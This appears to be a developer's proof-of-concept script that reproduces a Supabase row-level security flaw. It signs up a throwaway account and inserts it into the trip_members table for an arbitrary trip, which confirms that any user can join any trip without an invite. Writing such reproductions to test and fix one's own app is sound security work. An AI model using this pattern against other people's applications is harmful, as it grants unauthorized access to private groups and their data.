import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error('Missing Supabase URL or Anon Key in .env');
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

async function reproduceVulnerability() {
  console.log('Attempting to exploit trip_members INSERT policy...');

  // 1. Sign in or sign up a test user
  const email = `attacker_${Date.now()}@example.com`;
  const password = 'password123';

  console.log(`Creating attacker account: ${email}`);
  const { data: authData, error: authError } = await supabase.auth.signUp({
    email,
    password,
  });

  if (authError) {
    console.error('Auth error:', authError);
    return;
  }

  const user = authData.user;
  if (!user) {
    console.error('Failed to create user');
    return;
  }
  console.log(`Attacker logged in with ID: ${user.id}`);

  // 2. Attempt to join a random trip ID (simulating joining any trip)
  const targetTripId = '00000000-0000-0000-0000-000000000000'; // Random/Admin trip
  console.log(`Attempting to join arbitrary trip ID: ${targetTripId}`);

  const { data, error } = await supabase.from('trip_members').insert({
    trip_id: targetTripId,
    user_id: user.id, // Policy only checks user_id = auth.uid()!
    role: 'member',
  }).select();

  if (error) {
    console.log('Insert failed (Vulnerability NOT present or other error):', error.message);
  } else {
    console.log('SUCCESS: Inserted into trip_members!', data);
    console.log('VULNERABILITY CONFIRMED: User joined arbitrary trip without invite.');
  }

  // Cleanup (optional)
  // await supabase.auth.signOut();
}

reproduceVulnerability();
